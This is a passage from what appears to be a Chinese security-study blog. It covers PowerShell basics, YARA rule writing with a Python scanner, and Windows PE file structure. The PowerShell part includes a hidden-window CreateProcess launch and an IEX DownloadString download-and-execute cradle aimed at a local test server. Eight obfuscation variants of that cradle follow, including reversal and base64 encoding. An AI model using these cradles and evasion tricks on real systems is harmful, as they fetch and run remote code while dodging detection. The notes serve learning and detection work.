<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="variable">$i</span> = <span class="number">1</span></span><br><span class="line"><span class="keyword">while</span>(<span class="variable">$i</span> <span class="operator">-le</span> <span class="number">5</span>)&#123;</span><br><span class="line">  <span class="built_in">echo</span> <span class="variable">$i</span></span><br><span class="line">  <span class="variable">$i</span> +=<span class="number">1</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>do while</li>
</ul>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="variable">$i</span> = <span class="number">1</span></span><br><span class="line"><span class="keyword">do</span> &#123;</span><br><span class="line">  <span class="built_in">echo</span> <span class="variable">$i</span></span><br><span class="line">  <span class="variable">$i</span> +=<span class="number">1</span></span><br><span class="line">&#125;<span class="keyword">while</span>(<span class="variable">$i</span> <span class="operator">-le</span> <span class="number">5</span>)</span><br></pre></td></tr></table></figure>

<ul>
<li>continue</li>
</ul>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="variable">$i</span>=<span class="number">1</span> </span><br><span class="line"><span class="keyword">while</span>(<span class="variable">$i</span> <span class="operator">-le</span> <span class="number">5</span>)&#123;</span><br><span class="line">  <span class="keyword">if</span>(<span class="variable">$i</span> <span class="operator">-eq</span> <span class="number">3</span>)&#123;</span><br><span class="line">    <span class="variable">$i</span> +=<span class="number">1</span></span><br><span class="line">    <span class="keyword">continue</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">echo</span> <span class="variable">$i</span></span><br><span class="line">  <span class="variable">$i</span> +=<span class="number">1</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>break</li>
</ul>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">1</span>; <span class="variable">$i</span> <span class="operator">-lt</span> <span class="number">5</span>; <span class="variable">$a</span>+=<span class="number">1</span>)&#123;</span><br><span class="line">  <span class="keyword">if</span>(<span class="variable">$i</span> <span class="operator">-eq</span> <span class="number">3</span>)&#123;</span><br><span class="line">    <span class="keyword">break</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">echo</span> <span class="variable">$i</span></span><br><span class="line">  <span class="variable">$i</span> +=<span class="number">1</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="0x06-函数"><a href="#0x06-函数" class="headerlink" title="0x06 函数"></a>0x06 函数</h4><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">func</span><span class="params">([int]<span class="variable">$x</span>)</span></span>&#123;</span><br><span class="line">  <span class="variable">$res</span> = <span class="variable">$x</span> * <span class="variable">$x</span></span><br><span class="line">  <span class="keyword">return</span> <span class="variable">$res</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$result</span> = func(<span class="number">2</span>)</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$result</span></span><br></pre></td></tr></table></figure>

<h4 id="0x07-Win32API"><a href="#0x07-Win32API" class="headerlink" title="0x07 Win32API"></a>0x07 Win32API</h4><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 创建一个线程启动calc </span></span><br><span class="line"></span><br><span class="line"><span class="built_in">Add-Type</span> <span class="literal">-TypeDefinition</span> <span class="string">@&quot;    #声明</span></span><br><span class="line"><span class="string">using System;</span></span><br><span class="line"><span class="string">using System.Diagnostics;</span></span><br><span class="line"><span class="string">using System.Runtime.InteropServices;</span></span><br><span class="line"><span class="string">[StructLayout(LayoutKind.Sequential)]</span></span><br><span class="line"><span class="string">public struct PROCESS_INFORMATION</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">public IntPtr hProcess;</span></span><br><span class="line"><span class="string">public IntPtr hThread;</span></span><br><span class="line"><span class="string">public uint dwProcessId;</span></span><br><span class="line"><span class="string">public uint dwThreadId;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]</span></span><br><span class="line"><span class="string">public struct STARTUPINFO</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">public uint cb;</span></span><br><span class="line"><span class="string">public string lpReserved;</span></span><br><span class="line"><span class="string">public string lpDesktop;</span></span><br><span class="line"><span class="string">public string lpTitle;</span></span><br><span class="line"><span class="string">public uint dwX;</span></span><br><span class="line"><span class="string">public uint dwY;</span></span><br><span class="line"><span class="string">public uint dwXSize;</span></span><br><span class="line"><span class="string">public uint dwYSize;</span></span><br><span class="line"><span class="string">public uint dwXCountChars;</span></span><br><span class="line"><span class="string">public uint dwYCountChars;</span></span><br><span class="line"><span class="string">public uint dwFillAttribute;</span></span><br><span class="line"><span class="string">public uint dwFlags;</span></span><br><span class="line"><span class="string">public short wShowWindow;</span></span><br><span class="line"><span class="string">public short cbReserved2;</span></span><br><span class="line"><span class="string">public IntPtr lpReserved2;</span></span><br><span class="line"><span class="string">public IntPtr hStdInput;</span></span><br><span class="line"><span class="string">public IntPtr hStdOutput;</span></span><br><span class="line"><span class="string">public IntPtr hStdError;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">[StructLayout(LayoutKind.Sequential)]</span></span><br><span class="line"><span class="string">public struct SECURITY_ATTRIBUTES</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">public int length;</span></span><br><span class="line"><span class="string">public IntPtr lpSecurityDescriptor;</span></span><br><span class="line"><span class="string">public bool bInheritHandle;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">public static class Kernel32</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">[DllImport(&quot;kernel32.dll&quot;, SetLastError=true)]</span></span><br><span class="line"><span class="string">public static extern bool CreateProcess(</span></span><br><span class="line"><span class="string">string lpApplicationName,</span></span><br><span class="line"><span class="string">string lpCommandLine,</span></span><br><span class="line"><span class="string">ref SECURITY_ATTRIBUTES lpProcessAttributes,</span></span><br><span class="line"><span class="string">ref SECURITY_ATTRIBUTES lpThreadAttributes,</span></span><br><span class="line"><span class="string">bool bInheritHandles,</span></span><br><span class="line"><span class="string">uint dwCreationFlags,</span></span><br><span class="line"><span class="string">IntPtr lpEnvironment,</span></span><br><span class="line"><span class="string">string lpCurrentDirectory,</span></span><br><span class="line"><span class="string">ref STARTUPINFO lpStartupInfo,</span></span><br><span class="line"><span class="string">out PROCESS_INFORMATION lpProcessInformation);</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">&quot;@</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># StartupInfo Struct</span></span><br><span class="line"><span class="variable">$StartupInfo</span> = <span class="built_in">New-Object</span> STARTUPINFO</span><br><span class="line"><span class="variable">$StartupInfo</span>.dwFlags = <span class="number">0</span>x00000001 <span class="comment"># STARTF_USESHOWWINDOW</span></span><br><span class="line"><span class="variable">$StartupInfo</span>.wShowWindow = <span class="number">0</span>x0000 <span class="comment"># SW_HIDE</span></span><br><span class="line"><span class="variable">$StartupInfo</span>.cb = [<span class="type">System.Runtime.InteropServices.Marshal</span>]::SizeOf(<span class="variable">$StartupInfo</span>)</span><br><span class="line"><span class="comment"># Struct Size</span></span><br><span class="line"><span class="comment"># ProcessInfo Struct</span></span><br><span class="line"><span class="variable">$ProcessInfo</span> = <span class="built_in">New-Object</span> PROCESS_INFORMATION</span><br><span class="line"><span class="comment"># SECURITY_ATTRIBUTES Struct (Process &amp;amp; Thread)</span></span><br><span class="line"><span class="variable">$SecAttr</span> = <span class="built_in">New-Object</span> SECURITY_ATTRIBUTES</span><br><span class="line"><span class="variable">$SecAttr</span>.Length = [<span class="type">System.Runtime.InteropServices.Marshal</span>]::SizeOf(<span class="variable">$SecAttr</span>)</span><br><span class="line"><span class="comment"># CreateProcess In CurrentDirectory</span></span><br><span class="line"><span class="variable">$GetCurrentPath</span> = (<span class="built_in">Get-Item</span> <span class="literal">-Path</span> <span class="string">&quot;.\&quot;</span> <span class="literal">-Verbose</span>).FullName</span><br><span class="line"><span class="comment"># Call CreateProcess</span></span><br><span class="line">[<span class="type">Kernel32</span>]::CreateProcess(<span class="string">&quot;C:\Windows\System32\cmd.exe&quot;</span>, <span class="string">&quot;/c calc.exe&quot;</span>, [<span class="type">ref</span>] <span class="variable">$SecAttr</span>, [<span class="type">ref</span>] <span class="variable">$SecAttr</span>, <span class="variable">$false</span>,</span><br><span class="line"><span class="number">0</span>x08000000, [<span class="built_in">Int</span><span class="type">Ptr</span>]::Zero, <span class="variable">$GetCurrentPath</span>, [<span class="type">ref</span>] <span class="variable">$StartupInfo</span>, [<span class="type">ref</span>] <span class="variable">$ProcessInfo</span>) |<span class="built_in">out-null</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 感觉用起来比较麻烦，需要先去声明结构体啥的 再去调用</span></span><br></pre></td></tr></table></figure>

<br>

<h4 id="0x08-文件下载"><a href="#0x08-文件下载" class="headerlink" title="0x08 文件下载"></a>0x08 文件下载</h4><p><code>invoke-webrequest -Uri $url -OutFile $output</code></p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="variable">$url</span> = <span class="string">&quot;http://www.baidu.com&quot;</span></span><br><span class="line"><span class="variable">$output</span> = <span class="string">&quot;F:\1.html&quot;</span></span><br><span class="line"><span class="built_in">invoke-webrequest</span> <span class="literal">-Uri</span> <span class="variable">$url</span> <span class="literal">-OutFile</span> <span class="variable">$output</span></span><br></pre></td></tr></table></figure>

<p><code>(New-Object System.Net.WebClient).DownloadFile($url,$output)</code> </p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="variable">$url</span> = <span class="string">&quot;http://www.baidu.com&quot;</span></span><br><span class="line"><span class="variable">$output</span> = <span class="string">&quot;F:\2.html&quot;</span></span><br><span class="line">(<span class="built_in">New-Object</span> System.Net.WebClient).DownloadFile(<span class="variable">$url</span>,<span class="variable">$output</span>) </span><br></pre></td></tr></table></figure>

<br>

<h4 id="0x09-文件操作"><a href="#0x09-文件操作" class="headerlink" title="0x09 文件操作"></a>0x09 文件操作</h4><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 新建目录test</span></span><br><span class="line"><span class="built_in">New-Item</span> test <span class="literal">-ItemType</span> directory </span><br><span class="line"><span class="comment"># 删除目录test</span></span><br><span class="line"><span class="built_in">Remove-Item</span> test </span><br><span class="line"><span class="comment"># 新建文件test.txt</span></span><br><span class="line"><span class="built_in">New-Item</span> test.txt <span class="literal">-ItemType</span> file </span><br><span class="line"><span class="comment"># 新建文件test.txt，内容为 test</span></span><br><span class="line"><span class="built_in">New-Item</span> test.txt <span class="literal">-ItemType</span> file <span class="literal">-value</span> <span class="string">&quot;test&quot;</span> </span><br><span class="line"><span class="comment"># 删除文件test.txt</span></span><br><span class="line"><span class="built_in">Remove-Item</span> test.txt </span><br><span class="line"><span class="comment"># 查看文件test.txt内容</span></span><br><span class="line"><span class="built_in">Get-Content</span> test.txt </span><br><span class="line"><span class="comment"># 设置文件test.txt内容t</span></span><br><span class="line"><span class="built_in">Set-Content</span> test.txt <span class="literal">-Value</span> <span class="string">&quot;test&quot;</span> </span><br><span class="line"><span class="comment"># 给文件test.txt追加内容</span></span><br><span class="line"><span class="built_in">Add-Content</span> test.txt <span class="literal">-Value</span> <span class="string">&quot;,test2&quot;</span> </span><br><span class="line"><span class="comment"># 清除文件test.txt内容</span></span><br><span class="line"><span class="built_in">Clear-Content</span> test.txt</span><br></pre></td></tr></table></figure>

<br>

<h4 id="0x0a-简单混淆"><a href="#0x0a-简单混淆" class="headerlink" title="0x0a 简单混淆"></a>0x0a 简单混淆</h4><p><code>Invoke-Expression (New-Object System.Net.WebClient).DownloadString(&quot;http://127.0.0.1:8000/1.txt&quot;)</code></p>
<br>

<ul>
<li>1.去掉System关键词</li>
</ul>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Invoke-Expression</span> (<span class="built_in">New-Object</span> Net.WebClient).DownloadString(<span class="string">&quot;http://127.0.0.1:8000/1.txt&quot;</span>)</span><br></pre></td></tr></table></figure>

<ul>
<li>2.使用字符串连接+号连接</li>
</ul>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Invoke-Expression</span> (<span class="built_in">New-Object</span> Net.WebClient).DownloadString(<span class="string">&#x27;h&#x27;</span>+<span class="string">&#x27;ttp://127.0.0.1:8000/1.txt&#x27;</span>)</span><br></pre></td></tr></table></figure>

<ul>
<li>3.使用Invoke方法</li>
</ul>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Invoke-Expression</span> (<span class="built_in">New-Object</span> Net.WebClient).(<span class="string">&quot;DownloadString&quot;</span>).Invoke(<span class="string">&#x27;h&#x27;</span>+<span class="string">&#x27;ttp://127.0.0.1:8000/1.txt&#x27;</span>)</span><br></pre></td></tr></table></figure>

<ul>
<li>4.变量替代</li>
</ul>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="variable">$ds</span>=<span class="string">&quot;Down&quot;</span>+<span class="string">&quot;loadString&quot;</span>;</span><br><span class="line"><span class="built_in">Invoke-Expression</span> (<span class="built_in">New-Object</span> Net.WebClient).<span class="variable">$ds</span>.Invoke(<span class="string">&#x27;h&#x27;</span>+<span class="string">&#x27;ttp://127.0.0.1:8000/1.txt&#x27;</span>)</span><br></pre></td></tr></table></figure>

<ul>
<li>5.关键词使用单双引号引起来</li>
</ul>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Invoke-Expression</span> (<span class="built_in">New-Object</span> Net.WebClient).<span class="string">&quot;DownloadString&quot;</span>(<span class="string">&#x27;h&#x27;</span>+<span class="string">&#x27;ttp://127.0.0.1/powershell&#x27;</span>)</span><br></pre></td></tr></table></figure>

<ul>
<li>6.转义符号</li>
</ul>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Invoke-Expression</span> (<span class="built_in">New-Object</span> Net.WebClient).<span class="string">&quot;D o wn l oad Str in g&quot;</span>(<span class="string">&#x27;h&#x27;</span>+<span class="string">&#x27;ttp://127.0.0.1:8000/1.txt&#x27;</span>)</span><br></pre></td></tr></table></figure>

<ul>
<li>7.字符串反转</li>
</ul>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="variable">$re</span>= <span class="string">&quot;)&#x27;txt.1/0008:1.0.0.721//:ptth&#x27;(gnirtSdaolnwoD.)tneilCbeW.teN tcejbO-weN(&quot;</span>;</span><br><span class="line">(<span class="variable">$re</span>[-<span class="number">1</span><span class="type">..</span>-(<span class="variable">$re</span><span class="type">.Length</span>)] <span class="operator">-Join</span> <span class="string">&#x27;&#x27;</span>) | <span class="built_in">IEX</span></span><br></pre></td></tr></table></figure>

<ul>
<li>8.编码执行</li>
</ul>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="variable">$command</span> = <span class="string">&quot;Invoke-Expression (New-Object Net.WebClient).DownloadString(&#x27;h&#x27;+&#x27;ttp://127.0.0.1:8000/1.txt&#x27;)&quot;</span></span><br><span class="line"><span class="variable">$bytes</span> = [<span class="type">System.Text.Encoding</span>]::Unicode.GetBytes(<span class="variable">$command</span>)</span><br><span class="line"><span class="variable">$encodedCommand</span> = [<span class="type">Convert</span>]::ToBase64String(<span class="variable">$bytes</span>)</span><br><span class="line">powershell.exe <span class="literal">-EncodedCommand</span> <span class="variable">$encodedCommand</span></span><br></pre></td></tr></table></figure>

<h5 id="混淆工具"><a href="#混淆工具" class="headerlink" title="混淆工具"></a>混淆工具</h5><p> Invoke-Obfuscation</p>
<p><a href="https://github.com/danielbohannon/Invoke-Obfuscation">https://github.com/danielbohannon/Invoke-Obfuscation</a></p>
<p>Revoke-Obfuscation</p>
<br>

<h3 id="References"><a href="#References" class="headerlink" title="References"></a>References</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;gsh3ll.top&#x2F;2021&#x2F;12&#x2F;18&#x2F;%E3%80%90%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0%E3%80%91PowerShell%E5%9F%BA%E7%A1%80&#x2F;</span><br><span class="line">https:&#x2F;&#x2F;cloud.tencent.com&#x2F;developer&#x2F;article&#x2F;1639161</span><br><span class="line">https:&#x2F;&#x2F;www.secrss.com&#x2F;articles&#x2F;20119</span><br><span class="line">https:&#x2F;&#x2F;www.cnblogs.com&#x2F;linuxsec&#x2F;articles&#x2F;7384582.html</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
]]></content>
  </entry>
  <entry>
    <title>Yara规则学习-01</title>
    <url>/posts/db5cae05/</url>
    <content><![CDATA[<h3 id="官方demo"><a href="#官方demo" class="headerlink" title="官方demo"></a>官方demo</h3><p><a href="https://github.com/VirusTotal/yara">https://github.com/VirusTotal/yara</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">rule silent_banker : banker</span><br><span class="line">&#123;</span><br><span class="line">    meta:</span><br><span class="line">        description &#x3D; &quot;This is just an example&quot;</span><br><span class="line">        threat_level &#x3D; 3</span><br><span class="line">        in_the_wild &#x3D; true</span><br><span class="line"></span><br><span class="line">    strings:</span><br><span class="line">        $a &#x3D; &#123;6A 40 68 00 30 00 00 6A 14 8D 91&#125;</span><br><span class="line">        $b &#x3D; &#123;8D 4D B0 2B C1 83 C0 27 99 6A 4E 59 F7 F9&#125;</span><br><span class="line">        $c &#x3D; &quot;UVODFRYSIHLNWPEJXQZAKCBGMT&quot;   &#x2F;&#x2F;样本中出现的机器码或者字符串</span><br><span class="line"></span><br><span class="line">    condition:</span><br><span class="line">        $a or $b or $c          &#x2F;&#x2F; 满足其中一个条件即可进行匹配</span><br><span class="line">&#125;c</span><br></pre></td></tr></table></figure>

<br>

<h3 id="Yara规则语法"><a href="#Yara规则语法" class="headerlink" title="Yara规则语法"></a>Yara规则语法</h3><p>一般包含3部分，分别为 meta  string condition</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">rule RuleName</span><br><span class="line">&#123;</span><br><span class="line">    meta:           &#x2F;&#x2F;该规则的基础信息</span><br><span class="line">    strings:        &#x2F;&#x2F;用来定义字符串</span><br><span class="line">    condition:      &#x2F;&#x2F;编写表达式处理strings中的字符串</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="rule命名规则"><a href="#rule命名规则" class="headerlink" title="rule命名规则"></a>rule命名规则</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1.英文或字母组成的字符串</span><br><span class="line">2.可以使用下划线</span><br><span class="line">3.第一个字符禁止为数字</span><br><span class="line">4.大小写敏感</span><br><span class="line">5.不可以大于128个字符长度</span><br></pre></td></tr></table></figure>

<h4 id="Yara规则支持字符串、正则表达式、十六进制进行匹配。"><a href="#Yara规则支持字符串、正则表达式、十六进制进行匹配。" class="headerlink" title="Yara规则支持字符串、正则表达式、十六进制进行匹配。"></a>Yara规则支持字符串、正则表达式、十六进制进行匹配。</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">字符串：定义一个变量 $a &#x3D; “字符串内容”</span><br><span class="line"></span><br><span class="line">正则表达式：定义一个变量 $a &#x3D; &#x2F;正则表达式内容&#x2F;</span><br><span class="line"></span><br><span class="line">十六进制：定义一个变量 $a &#x3D; &#123;十六进制内容&#125;     </span><br><span class="line">#可以使用 ？ 作为通配符</span><br><span class="line">$hex1 &#x3D; &#123; EF E4 ?8 D8 ?? FB&#125;</span><br><span class="line">#不定长字符串可以用 [3-5]表示 无限长可以用[-]表示</span><br><span class="line">$hex2 &#x3D; &#123; EF E4 [-] A2 FB&#125;</span><br><span class="line">$hex3 &#x3D; &#123; EF E4 [2-4] D8 A2 FB&#125;</span><br></pre></td></tr></table></figure>

<h4 id="Yara规则常用修饰符"><a href="#Yara规则常用修饰符" class="headerlink" title="Yara规则常用修饰符"></a>Yara规则常用修饰符</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nocase：不区分大小写</span><br><span class="line">base64：base64字符串</span><br><span class="line">xor：异或字符串</span><br><span class="line">wide：宽字符</span><br></pre></td></tr></table></figure>

<h4 id="Yara规则条件"><a href="#Yara规则条件" class="headerlink" title="Yara规则条件"></a>Yara规则条件</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 布尔运算</span><br><span class="line">and：与   or：或   not：非</span><br><span class="line">all of them：         &#x2F;&#x2F;匹配所有条件即告警</span><br><span class="line">any of them：         &#x2F;&#x2F;匹配到其中一个条件即告警</span><br><span class="line">$a and $b and $c：    &#x2F;&#x2F;同时匹配到abc即告警</span><br><span class="line">($a and $b) or $c：   &#x2F;&#x2F;匹配到a和b或c即告警</span><br><span class="line">$a and $b and $c：    &#x2F;&#x2F;同时匹配到abc即告警</span><br><span class="line">($a and $b) or $c：   &#x2F;&#x2F;匹配到a和b或c即告警</span><br><span class="line"></span><br><span class="line"># 文件大小</span><br><span class="line">filesize &gt; 200KB</span><br><span class="line"></span><br><span class="line"># 访问指定位置数据</span><br><span class="line">unint16(0) and unit32(unit32(0x3c)) &#x3D;&#x3D; 0x00004550</span><br></pre></td></tr></table></figure>

<h4 id="Yara编写"><a href="#Yara编写" class="headerlink" title="Yara编写"></a>Yara编写</h4><p>先略过 后续有时间再搞一下</p>
<br>

<h3 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h3><p><code>pip install yara-python</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> yara</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取目录内的yara规则文件</span></span><br><span class="line"><span class="comment"># 将yara规则编译</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getRules</span>(<span class="params">path</span>):</span></span><br><span class="line">  filepath = &#123;&#125;</span><br><span class="line">  <span class="keyword">for</span> index, file <span class="keyword">in</span> <span class="built_in">enumerate</span>(os.listdir(path)):</span><br><span class="line">    rupath = os.path.join(path, file)</span><br><span class="line">    key = <span class="string">&quot;rule&quot;</span> + <span class="built_in">str</span>(index)</span><br><span class="line">    filepath[key] = rupath</span><br><span class="line">    print(rupath)</span><br><span class="line">    </span><br><span class="line">  yararule = yara.<span class="built_in">compile</span>(filepaths=filepath)</span><br><span class="line">  print(filepath)</span><br><span class="line">  print(yararule)</span><br><span class="line">  <span class="keyword">return</span> yararule</span><br><span class="line">  </span><br><span class="line"><span class="comment"># 扫描函数</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">scan</span>(<span class="params">rule, path</span>):</span></span><br><span class="line">  <span class="keyword">for</span> file <span class="keyword">in</span> os.listdir(path):</span><br><span class="line">    mapath = os.path.join(path, file)</span><br><span class="line">    <span class="built_in">print</span> (malpath+<span class="string">&quot;\\&quot;</span>+file)</span><br><span class="line">    fp = <span class="built_in">open</span>(malpath+<span class="string">&quot;\\&quot;</span>+file, <span class="string">&#x27;rb&#x27;</span>)</span><br><span class="line">    matches = rule.match(data=fp.read())</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(matches) &gt; <span class="number">0</span>:</span><br><span class="line">      <span class="built_in">print</span> (file, matches)</span><br><span class="line">      </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">  rulepath = <span class="string">&quot;F:\\yara\\rules&quot;</span> <span class="comment"># yara规则目录</span></span><br><span class="line">  malpath =<span class="string">&quot;F:\\yara\\samples&quot;</span> <span class="comment"># simple目录</span></span><br><span class="line">  <span class="comment"># yara规则编译函数调用</span></span><br><span class="line">  yararule = getRules(rulepath)</span><br><span class="line">  <span class="comment"># 扫描函数调用</span></span><br><span class="line">  scan(yararule, malpath)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<br>

<h3 id="References"><a href="#References" class="headerlink" title="References"></a>References</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;lengjibo.github.io&#x2F;yara&#x2F;</span><br><span class="line">https:&#x2F;&#x2F;zhuanlan.kanxue.com&#x2F;article-17369.htm</span><br><span class="line">https:&#x2F;&#x2F;toutiao.io&#x2F;posts&#x2F;05scc8&#x2F;preview</span><br></pre></td></tr></table></figure>
]]></content>
  </entry>
  <entry>
    <title>PE结构学习</title>
    <url>/posts/d8527941/</url>
    <content><![CDATA[<h3 id="PE文件结构"><a href="#PE文件结构" class="headerlink" title="PE文件结构"></a>PE文件结构</h3><h4 id="1-可执行文件"><a href="#1-可执行文件" class="headerlink" title="1.可执行文件"></a>1.可执行文件</h4><p>在windows平台下的可执行文件的格式，成为PE文件结构（Portable Executable）；</p>
<p>在Linux平台下的可执行文件格式成为ELF文件结构（Executable and Linking Format）</p>
<br>

<h4 id="2-PE指纹"><a href="#2-PE指纹" class="headerlink" title="2.PE指纹"></a>2.PE指纹</h4><p>在初始位置为 4D 5A （十进制为MZ） 而在0x3c后 有一个0x0100h（） 指向0x0100h（PE）处</p>
<p><img src="/posts/d8527941/1.png"></p>
<br>

<h4 id="3-PE整体结构"><a href="#3-PE整体结构" class="headerlink" title="3.PE整体结构"></a>3.PE整体结构</h4><p>下图是在github上大佬滴水的学习笔记上截的</p>
<p><img src="/posts/d8527941/2.png"></p>
<p><img src="/posts/d8527941/3.png"></p>
<br>

<p>在visual studio中 可以调用 &lt;windows.h&gt;去查看PE的结构体</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include &lt;windows.h&gt;</span><br><span class="line">_IMAGE_DOS_HEADER;</span><br><span class="line">_IMAGE_NT_HEADERS;</span><br><span class="line">_IMAGE_SECTION_HEADER</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>其中WORD类型 占2字节；DOWRD类型 占4个字节；BYTE类型 占1个字节</p>
<p>也可以调用python中的<code>pefile</code>库查看pe文件结构 (pip install pefile)</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pefile</span><br><span class="line"></span><br><span class="line">pe = pefile.PE(<span class="string">&#x27;1.exe&#x27;</span>)</span><br><span class="line">print(pe)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/posts/d8527941/4.png"></p>
<br>

<h4 id="4-PE文件整体结构解析"><a href="#4-PE文件整体结构解析" class="headerlink" title="4.PE文件整体结构解析"></a>4.PE文件整体结构解析</h4><h5 id="4-1-DOS头"><a href="#4-1-DOS头" class="headerlink" title="4.1 DOS头"></a>4.1 DOS头</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">typedef struct _IMAGE_DOS_HEADER &#123;      &#x2F;&#x2F; DOS .EXE header</span><br><span class="line">    WORD   e_magic;                     &#x2F;&#x2F; Magic number</span><br><span class="line">    WORD   e_cblp;                      &#x2F;&#x2F; Bytes on last page of file</span><br><span class="line">    WORD   e_cp;                        &#x2F;&#x2F; Pages in file</span><br><span class="line">    WORD   e_crlc;                      &#x2F;&#x2F; Relocations</span><br><span class="line">    WORD   e_cparhdr;                   &#x2F;&#x2F; Size of header in paragraphs</span><br><span class="line">    WORD   e_minalloc;                  &#x2F;&#x2F; Minimum extra paragraphs needed</span><br><span class="line">    WORD   e_maxalloc;                  &#x2F;&#x2F; Maximum extra paragraphs needed</span><br><span class="line">    WORD   e_ss;                        &#x2F;&#x2F; Initial (relative) SS value</span><br><span class="line">    WORD   e_sp;                        &#x2F;&#x2F; Initial SP value</span><br><span class="line">    WORD   e_csum;                      &#x2F;&#x2F; Checksum</span><br><span class="line">    WORD   e_ip;                        &#x2F;&#x2F; Initial IP value</span><br><span class="line">    WORD   e_cs;                        &#x2F;&#x2F; Initial (relative) CS value</span><br><span class="line">    WORD   e_lfarlc;                    &#x2F;&#x2F; File address of relocation table</span><br><span class="line">    WORD   e_ovno;                      &#x2F;&#x2F; Overlay number</span><br><span class="line">    WORD   e_res[4];                    &#x2F;&#x2F; Reserved words</span><br><span class="line">    WORD   e_oemid;                     &#x2F;&#x2F; OEM identifier (for e_oeminfo)</span><br><span class="line">    WORD   e_oeminfo;                   &#x2F;&#x2F; OEM information; e_oemid specific</span><br><span class="line">    WORD   e_res2[10];                  &#x2F;&#x2F; Reserved words</span><br><span class="line">    LONG   e_lfanew;                    &#x2F;&#x2F; File address of new exe header</span><br><span class="line">  &#125; IMAGE_DOS_HEADER, *PIMAGE_DOS_HEADER;</span><br></pre></td></tr></table></figure>

<p> WORD   e_magic;                         // Magic number 标志位(MZ 4D5A 占2个字节)</p>
<p>Long  e_lfanew;                            // File address of new exe header 偏移位置（指向下一个文件前面）</p>
<br>

<h5 id="4-2-PE-NT-文件头"><a href="#4-2-PE-NT-文件头" class="headerlink" title="4.2 PE(NT)文件头"></a>4.2 PE(NT)文件头</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">typedef struct _IMAGE_NT_HEADERS &#123;</span><br><span class="line">    DWORD Signature;                        &#x2F;&#x2F;PE标识</span><br><span class="line">    IMAGE_FILE_HEADER FileHeader;           &#x2F;&#x2F;标准PE头</span><br><span class="line">    IMAGE_OPTIONAL_HEADER32 OptionalHeader; &#x2F;&#x2F;拓展PE头</span><br><span class="line">&#125; IMAGE_NT_HEADERS32, *PIMAGE_NT_HEADERS32;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>第一部分为PE文件头标志，<code>DWORD Signature;</code> （50450000 dowrd占4个字节）</p>
